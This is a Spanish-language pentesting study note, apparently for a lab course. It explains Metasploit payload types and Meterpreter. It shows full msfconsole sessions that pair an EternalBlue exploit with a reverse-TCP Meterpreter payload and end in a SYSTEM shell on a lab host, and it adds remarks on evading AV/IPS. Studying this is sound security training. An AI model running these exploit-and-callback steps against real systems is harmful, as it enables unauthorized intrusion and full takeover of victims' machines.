---
tags:
  - Linux
  - Pentesting
  - Pentesting/Explotacion
Fecha de actualización: 2025-11-13
Nota previa: "[[Módulos]]"
Nota siguiente: "[[Encoders]]"
Area: "[[Ⓜ️🧨 Metasploit]]"
---
---

Un `Payload` en *Metasploit* se refiere a <mark style="background: #ADCCFFA6;">un módulo que ayuda al módulo de explotación a (normalmente) devolver un shell al atacante</mark>. Los payloads **se envían junto con el propio exploit para eludir los procedimientos de funcionamiento estándar del servicio vulnerable** (`exploits job`) y luego ejecutar en el sistema operativo de destino para normalmente devolver una conexión inversa al atacante y establecer un punto de apoyo (`payload's job`).

Hay **tres tipos diferentes de módulos de payloads en *Metasploit Framework***: *Singles*, *Stagers* y *Stages*.

# Single
<mark style="background: #ADCCFFA6;">El payload contiene el exploit y el código shell completo para la tarea seleccionada</mark>. Los payloads en línea son, por diseño, más estables que sus contrapartes porque contienen todo en uno. Sin embargo, <mark style="background: #FFB86CA6;">algunos exploits no admitirán el tamaño resultante de estos payloads, ya que pueden llegar a ser bastante grandes</mark>. Son payloads **autónomos**. Son el <mark style="background: #FFB8EBA6;">único objeto enviado y ejecutado en el sistema de destino</mark>, lo que nos proporciona un resultado inmediatamente después de la ejecución.

# Stagers (*Escenarios*)
Funcionan con los *Stage* para realizar una tarea específica. Un *Stager* <mark style="background: #ADCCFFA6;">está esperando en la máquina atacante, listo para establecer una conexión con el host víctima una vez que el *stage* complete su ejecución en el host remoto</mark>. **Se utilizan normalmente para establecer una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables**. [[Ⓜ️🧨 Metasploit]] utilizará el mejor y recurrirá al preferido cuando sea necesario.

# Stages (*Etapas*)
Son <mark style="background: #ADCCFFA6;">componentes de payload que se descargan mediante los módulos del *stager*</mark>. Las distintas etapas del payload proporcionan funciones avanzadas sin límites de tamaño, como Meterpreter, VNC Injection y otras.

---

# Payloads por etapas
**Es un proceso de [[3️⃣ Explotación|explotación]] que está modularizado y funcionalmente separado para ayudar a segregar las diferentes funciones que realiza en diferentes bloques de código**, <mark style="background: #FFB8EBA6;">cada uno completando su objetivo individualmente pero trabajando en encadenar el ataque</mark>. En última instancia, esto otorgará a un atacante acceso remoto a la máquina de destino si todas las etapas funcionan correctamente.

El alcance de este payload, como el de cualquier otro, además de otorgar acceso de shell al sistema de destino, es **ser lo más compacto y discreto posible para ayudar a evadir** el antivirus (`AV`) / Sistema de prevención de intrusiones (`IPS`), tanto como sea posible.

`Stage0` de un payload por etapas <mark style="background: #FFB86CA6;">representa el código shell inicial enviado a través de la red al servicio vulnerable de la máquina de destino</mark>, que tiene el único propósito de inicializar una conexión de regreso a la máquina atacante. Esto es lo que se conoce como **conexión inversa**. En *Metasploit*, los conoceremos bajo los nombres comunes `reverse_tcp`, `reverse_https`, y `bind_tcp`.

<mark style="background: #FF5582A6;">Es menos probable que las conexiones inversas activen sistemas de prevención porque el que inicializa la conexión es el host víctima</mark>, que la mayoría de las veces reside en lo que se conoce como `security trust zone`. Sin embargo, por supuesto, esta política de confianza no es seguida ciegamente por los dispositivos de seguridad y el personal de una red, por lo que el atacante debe actuar con cuidado incluso con este paso.

El código `Stage0` también tiene como objetivo leer un payload posterior más grande en la memoria una vez que llega. Una vez que se establece el canal de comunicación estable entre el atacante y la víctima, lo más probable es que la <mark style="background: #FFB8EBA6;">máquina atacante envíe una etapa de payload aún mayor que debería otorgarle acceso al shell</mark>. Este payload más grande sería la `Stage1`.

---

# Payload de Meterpreter
El [[Meterpreter]] es un <mark style="background: #ADCCFFA6;">tipo específico de payload multifacético que utiliza `DLL injection` para garantizar que la conexión con el host víctima sea estable</mark>, difícil de detectar mediante comprobaciones simples y persistente durante reinicios o cambios del sistema. *Meterpreter* **reside completamente en la memoria del host remoto y no deja rastros en el disco duro**, lo que hace que sea muy difícil de detectar con técnicas forenses convencionales. Además, se pueden utilizar scripts y complementos `loaded and unloaded` dinámicamente según sea necesario.

Una vez que se ejecuta la carga útil de Meterpreter, se crea una nueva sesión que genera la interfaz de Meterpreter. Es muy similar a la interfaz msfconsole, pero todos los comandos disponibles están dirigidos al sistema de destino, que la carga útil ha "infectado" Nos ofrece una gran cantidad de comandos útiles, que van desde la captura de pulsaciones de teclas, la recopilación de hash de contraseñas, el toque del micrófono y la captura de pantalla hasta la suplantación de tokens de seguridad del proceso. Profundizaremos en más detalles sobre Meterpreter en una sección posterior.

Usando Meterpreter, también podemos `load` en diferentes Plugins para ayudarnos con nuestra evaluación. Hablaremos más sobre esto en la sección Complementos de este módulo.

---

# Buscando payloads
Necesitamos saber **qué queremos hacer en la máquina de destino**. Por ejemplo, si buscamos la persistencia del acceso, probablemente querremos seleccionar un payload de *Meterpreter*. Nos ofrecen una cantidad significativa de flexibilidad. Su funcionalidad base ya es amplia e influyente. Podemos automatizar y entregar rápidamente combinados con complementos como [Complemento Mimikatz de GentilKiwi](https://github.com/gentilkiwi/mimikatz), manteniendo una evaluación organizada y eficaz en el tiempo. <mark style="background: #ADCCFFA6;">Para ver todas los payloads disponibles, comando `show payloads`.</mark>
```shell-session
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```
> [!tip]+
> Puede llevar bastante tiempo encontrar payload deseado con una lista tan extensa. También podemos utilizar `grep` en `msfconsole` **para filtrar términos específicos**. Por ejemplo, supongamos que queremos tener un `reverse shell` basado en`TCP` manejado por `Meterpreter` para nuestro exploit. En consecuencia, primero podemos buscar todos los resultados que contengan la palabra `Meterpreter` en los payloads:
> - `grep meterpreter show payloads`: muestra aquellos manejados por *Meterpreter*.
> - `grep meterpreter grep reverse_tcp show payloads`: muestra aquellos manejados por *Meterpreter* y que son [[Reverse shell]]

---

# Selección de payload
Al igual que con el módulo, **necesitamos el número de índice de la entrada que nos gustaría utilizar**. Para seleccionar el payload para el módulo seleccionado actualmente, utilizamos `set payload <no.>` <mark style="background: #ADCCFFA6;">sólo después de seleccionar un módulo exploit</mark>.
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```
> [!success]+
> Después de seleccionar un payload, tendremos más opciones disponibles. Podríamos ver que ha aparecido un nuevo campo de opciones, directamente relacionado con lo que contendrán los parámetros del payload. Nos centraremos en `LHOST` y `LPORT` (nuestra *IP* del atacante y el puerto deseado para la inicialización de la conexión inversa). Por supuesto, <mark style="background: #FF5582A6;">si el ataque falla, siempre podemos usar un puerto diferente y relanzar el ataque</mark>.

---

# Uso de payloads
Es hora de establecer nuestros parámetros tanto para el módulo Exploit como para el módulo de payload. Para la parte de exploit, necesitaremos configurar lo siguiente:

| **Parámetro** | **Descripción**                                         |
| ------------- | ------------------------------------------------------- |
| `RHOSTS`      | La dirección IP del host remoto, la máquina de destino. |
| `RPORT`       | Puerto del servicio que vamos a atacar.                 |

Para la parte de payload, necesitaremos configurar lo siguiente:

|**Parámetro**|**Descripción**|
|---|---|
|`LHOST`|La dirección IP del host, la máquina del atacante.|
|`LPORT`|No requiere cambio, solo una verificación de que el puerto aún no esté en uso.|


Luego, podemos **ejecutar el exploit y ver qué devuelve**. Vea las diferencias en el resultado a continuación:
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```
> [!info]+
> El mensaje no es de línea de comandos de *Windows*, sino de `Meterpreter`. El `whoami`, normalmente utilizado para *Windows*, <mark style="background: #FF5582A6;">no funciona aquí</mark>. En su lugar, podemos <mark style="background: #ADCCFFA6;">utilizar el equivalente de *Linux*</mark> de `getuid`. Explorando el el menú `help` nos brinda más información sobre de qué son capaces los payloads de *Meterpreter*.

## MSF - Navegación con Meterpreter
Al ejecutar el comando `shell` se crea `Channel 1` y nos colocamos automáticamente en la *CLI* de esta máquina. <mark style="background: #ADCCFFA6;">El canal aquí representa la conexión entre nuestro dispositivo y el host de destino</mark>, que se ha establecido en una conexión *TCP* inversa (desde el host de destino hasta nosotros) utilizando un *Meterpreter* *Stager* y *Stage*. El *stager* <mark style="background: #FFB8EBA6;">se activó en nuestra máquina para esperar una solicitud de conexión inicializada por el payload</mark> del *Stage* en la máquina de destino.
```shell-session
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

### MSF - CMD de Windows
En **algunos casos, es útil pasar a un shell estándar en el objetivo**, pero *Meterpreter* también puede navegar y realizar acciones en la máquina víctima. Entonces vemos que <mark style="background: #ADCCFFA6;">los comandos han cambiado, pero tenemos el mismo nivel de privilegios dentro del sistema</mark>.
```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

---

# Tipos de payload

La siguiente **tabla contiene los payloads más comunes utilizados para máquinas *Windows*** y sus respectivas descripciones.

| **Carga útil**                    | **Descripción**                                                                                          |
| --------------------------------- | -------------------------------------------------------------------------------------------------------- |
| `generic/custom`                  | Listerner genérico, multiuso                                                                             |
| `generic/shell_bind_tcp`          | Listerner genérico, multiuso, shell normal, enlace de conexión *TCP*                                     |
| `generic/shell_reverse_tcp`       | Listerner genérico, multiuso, shell normal, conexión *TCP* inversa                                       |
| `windows/x64/exec`                | Ejecuta un comando arbitrario (*Windows x64*)                                                            |
| `windows/x64/loadlibrary`         | Carga una ruta de biblioteca *x64* arbitraria                                                            |
| `windows/x64/messagebox`          | Genera un cuadro de diálogo a través de *MessageBox* utilizando un título, texto e ícono personalizables |
| `windows/x64/shell_reverse_tcp`   | Sell normal, carga útil única, conexión *TCP* inversa                                                    |
| `windows/x64/shell/reverse_tcp`   | Shell normal, stager + stage, conexión *TCP* inversa                                                     |
| `windows/x64/shell/bind_ipv6_tcp` | Shell normal, stager + stage, stager *TCP* de enlace *IPv6*                                              |
| `windows/x64/meterpreter/$`       | Payload de *Meterpreter* + variedades anteriores                                                         |
| `windows/x64/powershell/$`        | Sesiones interactivas de *PowerShell* + variedades anteriores                                            |
| `windows/x64/vncinject/$`         | Servidor *VNC* (inyección reflexiva) + variedades anteriores                                             |
> [!hacker]+
> **Otros payloads críticos** que los pentesters utilizan mucho durante las evaluaciones de seguridad son los payloads *Empire* y *Cobalt Strike.*